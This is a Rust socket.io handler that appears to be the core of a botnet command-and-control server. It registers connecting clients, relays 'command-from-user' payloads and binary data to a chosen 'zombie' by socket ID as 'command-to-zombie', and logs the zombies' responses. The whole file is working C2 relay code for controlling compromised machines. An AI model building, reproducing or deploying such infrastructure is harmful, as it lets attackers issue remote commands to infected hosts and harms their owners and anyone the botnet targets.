use super::super::super::utils::types::command_payload::CommandData;
use crate::c2s::types::client_store::ClientStore;
use serde_json::Value;
use socketioxide::extract::{Bin, Data, SocketRef};
use tracing::info;

pub fn on_connect(socket: SocketRef, Data(_): Data<Value>, clients: ClientStore) {
    let socket_id = socket.id.to_string();

    info!(
        "Client connected:\nNamespace: {:?}\nSocket ID: {:?}",
        socket.ns(),
        socket_id
    );

    clients
        .lock()
        .unwrap()
        .insert(socket_id.clone(), socket.clone());

    info!("Clients: {:#?}", clients);

    socket.emit("auth", socket.id).ok();

    let clients_clone = clients.clone();

    socket.on(
        "command-from-user",
        move |_: SocketRef, Data::<Value>(data), Bin(bin)| {
            info!("Received event: {:?} {:?}", data, bin);

            match serde_json::from_value::<CommandData>(data) {
                Ok(command_data) => {
                    let target_id = command_data.target_id;

                    if let Some(target_socket) = clients_clone.lock().unwrap().get(&target_id) {
                        target_socket
                            .bin(bin)
                            .emit("command-to-zombie", &command_data.command)
                            .ok();
                    }
                }

                Err(e) => {
                    info!("Error parsing command data: {:?}", e);
                }
            }
        },
    );

    socket.on(
        "command-response-from-zombie",
        |_: SocketRef, Data::<Value>(data), Bin(_)| {
            info!("Received event from zombie: {:?}", data);
        },
    );

    let clients_clone = clients.clone();
    socket.on_disconnect(move || {
        clients_clone.lock().unwrap().remove(&socket_id);
        info!("Client disconnected: {}", socket_id);
    });
}
